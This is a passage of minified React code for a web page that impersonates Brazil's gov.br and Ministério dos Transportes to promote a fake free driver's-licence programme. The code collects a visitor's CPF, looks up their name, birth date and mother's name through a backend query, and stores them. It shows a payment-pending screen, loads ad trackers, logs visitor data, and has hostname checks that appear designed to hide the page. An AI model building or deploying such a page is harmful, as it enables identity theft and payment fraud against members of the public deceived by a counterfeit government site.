                  className: "text-gray-500 text-xs",
                  children: "VALOR A PAGAR EM REAIS"
                }), l.jsxs("p", {
                  className: "font-bold text-lg",
                  children: ["R$ ", parseFloat(r.amount).toFixed(2).replace(".", ",")]
                })]
              })]
            })]
          })]
        }), l.jsxs("div", {
          className: "mt-4 bg-[#2670CC] text-white p-4 rounded-lg",
          children: [l.jsxs("div", {
            className: "flex items-center gap-3 mb-2",
            children: [l.jsx("span", {
              children: "Aguardando pagamento"
            }), l.jsxs("div", {
              className: "flex items-center gap-1",
              children: [l.jsx("span", {
                className: "w-2 h-2 bg-white rounded-full animate-bounce",
                style: {
                  animationDelay: "0ms"
                }
              }), l.jsx("span", {
                className: "w-2 h-2 bg-white rounded-full animate-bounce",
                style: {
                  animationDelay: "150ms"
                }
              }), l.jsx("span", {
                className: "w-2 h-2 bg-white rounded-full animate-bounce",
                style: {
                  animationDelay: "300ms"
                }
              })]
            })]
          }), l.jsx("p", {
            className: "text-sm",
            children: "Assim que o pagamento for confirmado, você será redirecionado automaticamente."
          })]
        })]
      })
    })]
  })
}
let Dg = !1;

function BE() {
  if (Dg) return;
  Dg = !0,
    function (t, n, r, s, o) {
      var c;
      t[r] = t[r] || function () {
        (t[r].q = t[r].q || []).push(arguments)
      };
      const i = n.createElement(s);
      i.async = !0, i.src = "https://www.clarity.ms/tag/" + o;
      const a = n.getElementsByTagName(s)[0];
      (c = a.parentNode) == null || c.insertBefore(i, a)
    }(window, document, "clarity", "script", "uje4o1wabk"),
    function (t, n, r) {
      t.TiktokAnalyticsObject = r;
      const s = t[r] = t[r] || [];
      s.methods = ["page", "track", "identify", "instances", "debug", "on", "off", "once", "ready", "alias", "group", "enableCookie", "disableCookie", "holdConsent", "revokeConsent", "grantConsent"], s.setAndDefer = function (o, i) {
        o[i] = function () {
          o.push([i].concat(Array.prototype.slice.call(arguments, 0)))
        }
      };
      for (let o = 0; o < s.methods.length; o++) s.setAndDefer(s, s.methods[o]);
      s.instance = function (o) {
        const i = s._i[o] || [];
        for (let a = 0; a < s.methods.length; a++) s.setAndDefer(i, s.methods[a]);
        return i
      }, s.load = function (o, i) {
        var d;
        const a = "https://analytics.tiktok.com/i18n/pixel/events.js";
        s._i = s._i || {}, s._i[o] = [], s._i[o]._u = a, s._t = s._t || {}, s._t[o] = +new Date, s._o = s._o || {}, s._o[o] = i || {};
        const c = n.createElement("script");
        c.type = "text/javascript", c.async = !0, c.src = a + "?sdkid=" + o + "&lib=" + r;
        const u = n.getElementsByTagName("script")[0];
        (d = u.parentNode) == null || d.insertBefore(c, u)
      }, s.load("D5E1SGRC77U40DIQKK20"), s.page()
    }(window, document, "ttq"),
    function (t, n, r, s) {
      var c;
      if (t.fbq) return;
      const o = t.fbq = function () {
        o.callMethod ? o.callMethod.apply(o, arguments) : o.queue.push(arguments)
      };
      t._fbq || (t._fbq = o), o.push = o, o.loaded = !0, o.version = "2.0", o.queue = [];
      const i = n.createElement(r);
      i.async = !0, i.src = s;
      const a = n.getElementsByTagName(r)[0];
      (c = a.parentNode) == null || c.insertBefore(i, a)
    }(window, document, "script", "https://connect.facebook.net/en_US/fbevents.js");
  const e = window.fbq;
  e && (e("init", "3270339329986286"), e("init", "1555494242118668"), e("init", "1154359756859567"), e("init", "2062889337802425"), e("track", "PageView")), document.title = "gov.br - Programa CNH do Brasil"
}

function Mg() {
  const e = navigator.userAgent || navigator.vendor || window.opera || "",
    t = e.indexOf("FBAN") > -1 || e.indexOf("FBAV") > -1 || e.indexOf("FB_IAB") > -1 || e.indexOf("FB4A") > -1 || e.indexOf("FBIOS") > -1,
    n = e.indexOf("Instagram") > -1,
    r = e.indexOf("FB_MESSENGER") > -1 || e.indexOf("MESSENGER") > -1 || e.indexOf("Messenger") > -1;
  return {
    isFacebook: t,
    isInstagram: n,
    isMessenger: r,
    isAllowed: !0,
    userAgent: e
  }
}

function zE() {
  const e = new URLSearchParams(window.location.search);
  return {
    fbclid: e.get("fbclid"),
    utmSource: e.get("utm_source"),
    utmMedium: e.get("utm_medium"),
    utmCampaign: e.get("utm_campaign"),
    utmContent: e.get("utm_content"),
    utmTerm: e.get("utm_term")
  }
}
async function UE(e) {
  var n;
  const t = zE();
  try {
    if (window.location.protocol === "file:") return;
    if (window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1") return;
    await fetch("/api/log-access", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        userAgent: e.userAgent,
        isFacebook: e.isFacebook,
        isInstagram: e.isInstagram,
        isMessenger: e.isMessenger,
        isAllowed: e.isAllowed,
        referrer: document.referrer || null,
        url: window.location.href,
        fbclid: t.fbclid,
        utmSource: t.utmSource,
        utmMedium: t.utmMedium,
        utmCampaign: t.utmCampaign,
        utmContent: t.utmContent,
        utmTerm: t.utmTerm,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        language: navigator.language,
        platform: ((n = navigator.userAgentData) == null ? void 0 : n.platform) || navigator.platform || ""
      })
    })
  } catch (r) {
    console.error("Error logging access:", r)
  }
}

function lw() {
  const e = window.location.pathname;
  return /^\/\d{11}$/.test(e)
}

function $E() {
  if (window.location.protocol === "file:") return !0;
  const e = window.location.hostname,
    t = e.includes("replit.dev") || e === "localhost" || e === "127.0.0.1",
    n = e.includes(".replit.app");
  return t && !n
}

function HE() {
  const e = window.location.hostname;
  return e === "gov.operadora.inc" || e.includes("operadora.inc") ? lw() : !1
}

function WE({
  children: e
}) {
  const [t, n] = x.useState(() => {
    const o = Mg(),
      i = lw(),
      a = $E(),
      c = HE();
    return o.isAllowed || i || a || c
  }), [r, s] = x.useState(!1);
  return x.useEffect(() => {
    if (!r) {
      const o = Mg();
      UE(o), s(!0)
    }
  }, [r]), t ? (BE(), l.jsx(l.Fragment, {
    children: e
  })) : (document.title = "about:blank", document.body.style.margin = "0", document.body.style.padding = "0", document.body.style.backgroundColor = "white", null)
}
var cw = {
  color: void 0,
  size: void 0,
  className: void 0,
  style: void 0,
  attr: void 0
},
  _g = ce.createContext && ce.createContext(cw),
  KE = ["attr", "size", "title"];

function QE(e, t) {
  if (e == null) return {};
  var n = GE(e, t),
    r, s;
  if (Object.getOwnPropertySymbols) {
    var o = Object.getOwnPropertySymbols(e);
    for (s = 0; s < o.length; s++) r = o[s], !(t.indexOf(r) >= 0) && Object.prototype.propertyIsEnumerable.call(e, r) && (n[r] = e[r])
  }
  return n
}

function GE(e, t) {
  if (e == null) return {};
  var n = {};
  for (var r in e)
    if (Object.prototype.hasOwnProperty.call(e, r)) {
      if (t.indexOf(r) >= 0) continue;
      n[r] = e[r]
    } return n
}

function ml() {
  return ml = Object.assign ? Object.assign.bind() : function (e) {
    for (var t = 1; t < arguments.length; t++) {
      var n = arguments[t];
      for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r])
    }
    return e
  }, ml.apply(this, arguments)
}

function Ig(e, t) {
  var n = Object.keys(e);
  if (Object.getOwnPropertySymbols) {
    var r = Object.getOwnPropertySymbols(e);
    t && (r = r.filter(function (s) {
      return Object.getOwnPropertyDescriptor(e, s).enumerable
    })), n.push.apply(n, r)
  }
  return n
}

function pl(e) {
  for (var t = 1; t < arguments.length; t++) {
    var n = arguments[t] != null ? arguments[t] : {};
    t % 2 ? Ig(Object(n), !0).forEach(function (r) {
      qE(e, r, n[r])
    }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(n)) : Ig(Object(n)).forEach(function (r) {
      Object.defineProperty(e, r, Object.getOwnPropertyDescriptor(n, r))
    })
  }
  return e
}

function qE(e, t, n) {
  return t = YE(t), t in e ? Object.defineProperty(e, t, {
    value: n,
    enumerable: !0,
    configurable: !0,
    writable: !0
  }) : e[t] = n, e
}

function YE(e) {
  var t = XE(e, "string");
  return typeof t == "symbol" ? t : t + ""
}

function XE(e, t) {
  if (typeof e != "object" || !e) return e;
  var n = e[Symbol.toPrimitive];
  if (n !== void 0) {
    var r = n.call(e, t || "default");
    if (typeof r != "object") return r;
    throw new TypeError("@@toPrimitive must return a primitive value.")
  }
  return (t === "string" ? String : Number)(e)
}

function uw(e) {
  return e && e.map((t, n) => ce.createElement(t.tag, pl({
    key: n
  }, t.attr), uw(t.child)))
}

function ht(e) {
  return t => ce.createElement(JE, ml({
    attr: pl({}, e.attr)
  }, t), uw(e.child))
}

function JE(e) {
  var t = n => {
    var {
      attr: r,
      size: s,
      title: o
    } = e, i = QE(e, KE), a = s || n.size || "1em", c;
    return n.className && (c = n.className), e.className && (c = (c ? c + " " : "") + e.className), ce.createElement("svg", ml({
      stroke: "currentColor",
      fill: "currentColor",
      strokeWidth: "0"
    }, n.attr, r, i, {
      className: c,
      style: pl(pl({
        color: e.color || n.color
      }, n.style), e.style),
      height: a,
      width: a,
      xmlns: "http://www.w3.org/2000/svg"
    }), o && ce.createElement("title", null, o), e.children)
  };
  return _g !== void 0 ? ce.createElement(_g.Consumer, null, n => t(n)) : t(cw)
}

function Lg(e) {
  return ht({
    tag: "svg",
    attr: {
      viewBox: "0 0 320 512"
    },
    child: [{
      tag: "path",
      attr: {
        d: "M279.14 288l14.22-92.66h-88.91v-60.13c0-25.35 12.42-50.06 52.24-50.06h40.42V6.26S260.43 0 225.36 0c-73.22 0-121.08 44.38-121.08 124.72v70.62H22.89V288h81.39v224h100.17V288z"
      },
      child: []
    }]
  })(e)
}

function ZE(e) {
  return ht({
    tag: "svg",
    attr: {
      viewBox: "0 0 448 512"
    },
    child: [{
      tag: "path",
      attr: {
        d: "M400 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zM144.5 319c-35.1 0-63.5-28.4-63.5-63.5s28.4-63.5 63.5-63.5 63.5 28.4 63.5 63.5-28.4 63.5-63.5 63.5zm159 0c-35.1 0-63.5-28.4-63.5-63.5s28.4-63.5 63.5-63.5 63.5 28.4 63.5 63.5-28.4 63.5-63.5 63.5z"
      },
      child: []
    }]
  })(e)
}

function eT(e) {
  return ht({
    tag: "svg",
    attr: {
      viewBox: "0 0 448 512"
    },
    child: [{
      tag: "path",
      attr: {
        d: "M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"
      },
      child: []
    }]
  })(e)
}

function Og(e) {
  return ht({
    tag: "svg",
    attr: {
      viewBox: "0 0 448 512"
    },
    child: [{
      tag: "path",
      attr: {
        d: "M100.28 448H7.4V148.9h92.88zM53.79 108.1C24.09 108.1 0 83.5 0 53.8a53.79 53.79 0 0 1 107.58 0c0 29.7-24.1 54.3-53.79 54.3zM447.9 448h-92.68V302.4c0-34.7-.7-79.2-48.29-79.2-48.29 0-55.69 37.7-55.69 76.7V448h-92.78V148.9h89.08v40.8h1.3c12.4-23.5 42.69-48.3 87.88-48.3 94 0 111.28 61.9 111.28 142.3V448z"
      },
      child: []
    }]
  })(e)
}

function tT(e) {
  return ht({
    tag: "svg",
    attr: {
      viewBox: "0 0 512 512"
    },
    child: [{
      tag: "path",
      attr: {
        d: "M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"
      },
      child: []
    }]
  })(e)
}

function nT(e) {
  return ht({
    tag: "svg",
    attr: {
      viewBox: "0 0 448 512"
    },
    child: [{
      tag: "path",
      attr: {
        d: "M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4 0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3 0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2 0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2 0-101.7 82.8-184.5 184.6-184.5 49.3 0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5 0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8-3.7 5.6-14.3 18-17.6 21.8-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2-3.7 0-9.7 1.4-14.8 6.9-5.1 5.6-19.4 19-19.4 46.3 0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"
      },
      child: []
    }]
  })(e)
}

function rT(e) {
  return ht({
    tag: "svg",
    attr: {
      viewBox: "0 0 576 512"
    },
    child: [{
      tag: "path",
      attr: {
        d: "M549.655 124.083c-6.281-23.65-24.787-42.276-48.284-48.597C458.781 64 288 64 288 64S117.22 64 74.629 75.486c-23.497 6.322-42.003 24.947-48.284 48.597-11.412 42.867-11.412 132.305-11.412 132.305s0 89.438 11.412 132.305c6.281 23.65 24.787 41.5 48.284 47.821C117.22 448 288 448 288 448s170.78 0 213.371-11.486c23.497-6.321 42.003-24.171 48.284-47.821 11.412-42.867 11.412-132.305 11.412-132.305s0-89.438-11.412-132.305zm-317.51 213.508V175.185l142.739 81.205-142.739 81.201z"
      },
      child: []
    }]
  })(e)
}

function Zr(e) {
  return ht({
    tag: "svg",
    attr: {
      viewBox: "0 0 448 512"
    },
    child: [{
      tag: "path",
      attr: {
        d: "M207.029 381.476L12.686 187.132c-9.373-9.373-9.373-24.569 0-33.941l22.667-22.667c9.357-9.357 24.522-9.375 33.901-.04L224 284.505l154.745-154.021c9.379-9.335 24.544-9.317 33.901.04l22.667 22.667c9.373 9.373 9.373 24.569 0 33.941L240.971 381.476c-9.373 9.372-24.569 9.372-33.942 0z"
      },
      child: []
    }]
  })(e)
}

function es(e) {
  return ht({
    tag: "svg",
    attr: {
      viewBox: "0 0 320 512"
    },
    child: [{
      tag: "path",
      attr: {
        d: "M285.476 272.971L91.132 467.314c-9.373 9.373-24.569 9.373-33.941 0l-22.667-22.667c-9.357-9.357-9.375-24.522-.04-33.901L188.505 256 34.484 101.255c-9.335-9.379-9.317-24.544.04-33.901l22.667-22.667c9.373-9.373 24.569-9.373 33.941 0L285.475 239.03c9.373 9.372 9.373 24.568.001 33.941z"
      },
      child: []
    }]
  })(e)
}

function sT(e) {
  return ht({
    tag: "svg",
    attr: {
      viewBox: "0 0 512 512"
    },
    child: [{
      tag: "path",
      attr: {
        d: "M510.37 254.79l-12.08-76.26a132.493 132.493 0 0 0-37.16-72.95l-54.76-54.75c-19.73-19.72-45.18-32.7-72.71-37.05l-76.7-12.15c-27.51-4.36-55.69.11-80.52 12.76L107.32 49.6a132.25 132.25 0 0 0-57.79 57.8l-35.1 68.88a132.602 132.602 0 0 0-12.82 80.94l12.08 76.27a132.493 132.493 0 0 0 37.16 72.95l54.76 54.75a132.087 132.087 0 0 0 72.71 37.05l76.7 12.14c27.51 4.36 55.69-.11 80.52-12.75l69.12-35.21a132.302 132.302 0 0 0 57.79-57.8l35.1-68.87c12.71-24.96 17.2-53.3 12.82-80.96zM176 368c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32zm32-160c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32zm160 128c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32z"
      },
      child: []
    }]
  })(e)
}

function oT(e) {
  return ht({
    tag: "svg",
    attr: {
      viewBox: "0 0 576 512"
    },
    child: [{
      tag: "path",
      attr: {
        d: "M280.37 148.26L96 300.11V464a16 16 0 0 0 16 16l112.06-.29a16 16 0 0 0 15.92-16V368a16 16 0 0 1 16-16h64a16 16 0 0 1 16 16v95.64a16 16 0 0 0 16 16.05L464 480a16 16 0 0 0 16-16V300L295.67 148.26a12.19 12.19 0 0 0-15.3 0zM571.6 251.47L488 182.56V44.05a12 12 0 0 0-12-12h-56a12 12 0 0 0-12 12v72.61L318.47 43a48 48 0 0 0-61 0L4.34 251.47a12 12 0 0 0-1.6 16.9l25.5 31A12 12 0 0 0 45.15 301l235.22-193.74a12.19 12.19 0 0 1 15.3 0L530.9 301a12 12 0 0 0 16.9-1.6l25.5-31a12 12 0 0 0-1.7-16.93z"
      },
      child: []
    }]
  })(e)
}

function iT(e) {
  return ht({
    tag: "svg",
    attr: {
      viewBox: "0 0 512 512"
    },
    child: [{
      tag: "path",
      attr: {
        d: "M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"
      },
      child: []
    }]
  })(e)
}

function aT(e) {
  return ht({
    tag: "svg",
    attr: {
      viewBox: "0 0 352 512"
    },
    child: [{
      tag: "path",
      attr: {
        d: "M242.72 256l100.07-100.07c12.28-12.28 12.28-32.19 0-44.48l-22.24-22.24c-12.28-12.28-32.19-12.28-44.48 0L176 189.28 75.93 89.21c-12.28-12.28-32.19-12.28-44.48 0L9.21 111.45c-12.28 12.28-12.28 32.19 0 44.48L109.28 256 9.21 356.07c-12.28 12.28-12.28 32.19 0 44.48l22.24 22.24c12.28 12.28 32.2 12.28 44.48 0L176 322.72l100.07 100.07c12.28 12.28 32.2 12.28 44.48 0l22.24-22.24c12.28-12.28 12.28-32.19 0-44.48L242.72 256z"
      },
      child: []
    }]
  })(e)
}

function lT(e) {
  return ht({
    tag: "svg",
    attr: {
      viewBox: "0 0 512 512"
    },
    child: [{
      tag: "path",
      attr: {
        d: "M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"
      },
      child: []
    }]
  })(e)
}

function cT(e) {
  return e.replace(/\D/g, "").replace(/(\d{3})(\d{3})(\d{3})(\d{2})/g, "$1.$2.$3-$4")
}

function bo(e) {
  return e.replace(/\D/g, "")
}

function uT() {
  const [, e] = In(), [t, n] = x.useState(""), [r, s] = x.useState(0), [o, i] = x.useState(!1), [a, c] = x.useState(""), [u, d] = x.useState(!1);
  x.useEffect(() => {
    const w = localStorage.getItem("userData");
    if (w) {
      const v = JSON.parse(w);
      v.nome && n(v.nome.split(" ")[0])
    }
  }, []), x.useEffect(() => {
    let w = window.scrollY,
      v = !1,
      S = null;
    const g = () => {
      if (!v) {
        const p = window.scrollY,
          m = p - w;
        Math.abs(m) > 5 && (S && clearTimeout(S), m > 0 ? s(-20) : s(20), w = p, S = setTimeout(() => {
          s(0)
        }, 300)), v = !0, setTimeout(() => {
          v = !1
        }, 100)
      }
    };
    return window.addEventListener("scroll", g, {
      passive: !0
    }), () => {
      window.removeEventListener("scroll", g), S && clearTimeout(S)
    }
  }, []);
  const f = () => {
    e("/login")
  },
    h = w => {
      let v = w.target.value;
      v = bo(v), c(cT(v.slice(0, 11)))
    },
    y = async w => {
      w.preventDefault();
      if (!a || bo(a).length < 11) return;
      d(!0);
      try {
        const v = bo(a),
          g = await (await fetch(`/api/consulta.php?cpf=${v}`)).json();
        g.DADOS && g.DADOS.nome && g.DADOS.nome.trim() !== "" && g.DADOS.data_nascimento && g.DADOS.data_nascimento.trim() !== "" ? (localStorage.setItem("userData", JSON.stringify({
          cpf: v,
          nome: g.DADOS.nome,
          dataNascimento: g.DADOS.data_nascimento,
          nomeMae: g.DADOS.nome_mae || ""
        })), e(`/verificacao?data=${encodeURIComponent(JSON.stringify(g.DADOS))}`)) : e(`/verificacao?data=${encodeURIComponent(JSON.stringify({ cpf: v, nome: "", nome_mae: "", data_nascimento: "", sexo: "", manualEntry: !0 }))}`)
      } catch (v) {
        console.error("Error fetching data:", v);
        const g = {
          cpf: bo(a),
          nome: "",
          nome_mae: "",
          data_nascimento: "",
          sexo: "",
          manualEntry: !0
        };
        e(`/verificacao?data=${encodeURIComponent(JSON.stringify(g))}`)
      } finally {
        d(!1)
      }
    };
  return l.jsxs("div", {
    className: "bg-white",
    children: [l.jsxs("header", {
      style: {
        backgroundColor: "white",
        padding: "12px 24px",
        display: "flex",
        justifyContent: "space-between",
        alignItems: "center",
        border: "none",
        boxShadow: "none"
      },
      children: [l.jsxs("div", {
        style: {
          display: "flex",
          alignItems: "center",
          background: "none",
          boxShadow: "none"
        },
        children: [l.jsx("img", {
          src: "https://i.ibb.co/zPFChvR/logo645.png",
          alt: "Logo gov.br estilizada com texto em azul e amarelo",
          style: {
            marginRight: "32px",
            background: "none",
            boxShadow: "none"
          },
          width: "70",
          height: "24"
        }), l.jsx("button", {
          style: {
            border: "none",
            color: "#1451B4",
            fontSize: "14px",
            marginLeft: "32px",
            cursor: "pointer",
            background: "none",
            boxShadow: "none",
            padding: 0
          },
          "aria-label": "Menu de links",
          children: l.jsx("i", {
            className: "fas fa-ellipsis-v",
            style: {
              background: "none",
              boxShadow: "none",
              fontSize: "16px"
            },
            "aria-hidden": "true"
          })
        }), l.jsx("div", {
          style: {
            borderLeft: "1px solid #ccc",
            height: "24px",
            margin: "0 16px",
            background: "none",
            boxShadow: "none"
          }
        })]
      }), l.jsxs("div", {
        style: {
          display: "flex",
          alignItems: "center",
          background: "none",
          boxShadow: "none"
        },
        children: [l.jsx("button", {
          style: {
            border: "none",
            color: "#1451B4",
            cursor: "pointer",
            marginLeft: "24px",
            background: "none",
            boxShadow: "none",
            padding: 0
          },
          children: l.jsx("i", {
            className: "fas fa-cookie-bite",
            style: {
              background: "none",
              boxShadow: "none",
              fontSize: "16px"
            },
            "aria-hidden": "true"
          })
        }), l.jsx("button", {
          style: {
            border: "none",
            color: "#1451B4",
            cursor: "pointer",
            marginLeft: "24px",
            background: "none",
            boxShadow: "none",
            padding: 0
          },
          type: "button",
          "aria-label": "Sistemas",
          children: l.jsx("i", {
            className: "fas fa-th",
            style: {
              background: "none",
              boxShadow: "none",
              fontSize: "16px"
            },
            "aria-hidden": "true"
          })
        }), l.jsxs("button", {
          onClick: () => i(!0),
          style: {
            backgroundColor: "#1451B4",
            color: "white",
            border: "none",
            borderRadius: "9999px",
            padding: "6px 16px",
            display: "flex",
            alignItems: "center",
            fontSize: "14px",
            cursor: "pointer",
            marginLeft: "24px",
            boxShadow: "none"
          },
          type: "button",
          children: [l.jsx("i", {
            className: "fas fa-user",
            style: {
              color: "white",
              marginRight: "8px",
              background: "none",
              boxShadow: "none",
              fontSize: "16px"
            },
            "aria-hidden": "true"
          }), l.jsx("span", {
            children: t || "Entrar"
          })]
        })]
      })]
    }), l.jsxs("nav", {
      style: {
        backgroundColor: "white",
        padding: "16px 24px",
        display: "flex",
        justifyContent: "space-between",
        alignItems: "center",
        border: "none",
        boxShadow: "none"
      },
      children: [l.jsxs("button", {
        style: {
          border: "none",
          color: "#1451B4",
          display: "flex",
          alignItems: "center",
          cursor: "pointer",
          background: "none",
          boxShadow: "none",
          padding: 0
        },
        children: [l.jsx("i", {
          className: "fas fa-bars",
          style: {
            marginRight: "10px",
            fontSize: "16px",
            background: "none",
            boxShadow: "none"
          },
          "aria-hidden": "true"
        }), l.jsx("span", {
          style: {
            color: "#666",
            fontSize: "1rem",
            fontWeight: 300,
            lineHeight: "20px",
            paddingTop: "2px",
            background: "none",
            boxShadow: "none"
          },
          children: "Ministério dos Transportes"
        })]
      }), l.jsx("button", {
        style: {
          border: "none",
          color: "#1451B4",
          fontSize: "16px",
          cursor: "pointer",
          background: "none",
          boxShadow: "none",
          padding: 0
        },
        "aria-label": "Pesquisar",
        children: l.jsx("i", {
          className: "fas fa-search",
          style: {
            background: "none",
            boxShadow: "none"
          },
          "aria-hidden": "true"
        })
      })]
    }), l.jsx("div", {
      className: "px-4 py-3",
      children: l.jsxs("nav", {
        className: "flex items-center text-sm text-gray-600 flex-wrap gap-1",
        children: [l.jsx(oT, {
          className: "text-[#1351B4] text-xs"
        }), l.jsx(es, {
          className: "text-gray-400 text-xs mx-1"
        }), l.jsx("span", {
          className: "text-[#1351B4]",
          children: "Assuntos"
        }), l.jsx(es, {
          className: "text-gray-400 text-xs mx-1"
        }), l.jsx("span", {
          className: "text-[#1351B4]",
          children: "Notícias"
        }), l.jsx(es, {
          className: "text-gray-400 text-xs mx-1"
        }), l.jsx("span", {
          className: "text-[#1351B4]",
          children: "2025"
        }), l.jsx(es, {
          className: "text-gray-400 text-xs mx-1"
        }), l.jsx("span", {
          className: "text-[#1351B4]",
          children: "12"
        }), l.jsx(es, {
          className: "text-gray-400 text-xs mx-1"
        }), l.jsx("span", {
          className: "font-semibold",
          style: {
            fontSize: "0.8125rem",
            color: "#333333"
          },
          children: "Como solicitar sua Carteira de motorista gratuitamente e sem autoescola"
        })]
      })
    }), l.jsx("div", {
      className: "border-b border-gray-200"
    }), l.jsxs("main", {
      className: "px-4 py-6 max-w-4xl mx-auto",
      children: [l.jsx("div", {
        className: "mb-4",
        children: l.jsx("span", {
          className: "font-bold text-sm uppercase tracking-wide",
          style: {
            color: "#555555"
          },
          children: "TRÂNSITO"
        })
      }), l.jsx("h1", {
        className: "text-2xl md:text-3xl font-bold leading-tight mb-4",
        style: {
          color: "#0c326f"
        },
        children: "CNH do Brasil: Governo libera carteira de motorista 100% online e sem necessidade de autoescola"
      }), l.jsxs("p", {
        className: "text-base leading-relaxed mb-6",
        style: {
          color: "#555555"
        },
        children: ["Mais de 1 milhão de brasileiros já iniciaram o processo para obter a CNH gratuitamente pelo programa, e ", l.jsx("strong", {
          style: {
            color: "#333333"
          },
          children: "as vagas para 2026 estão se esgotando."
        }), " A Resolução nº 985/2025 do Contran, publicada em 09 de dezembro de 2025, revoluciona o processo de habilitação no país. Agora brasileiros podem tirar a CNH em menos de 20 dias, sem custos com autoescola e com curso teórico totalmente online e gratuito."]
      }), l.jsxs("div", {
        className: "flex items-center gap-4 mb-4",
        children: [l.jsx("span", {
          className: "text-gray-500 text-sm",
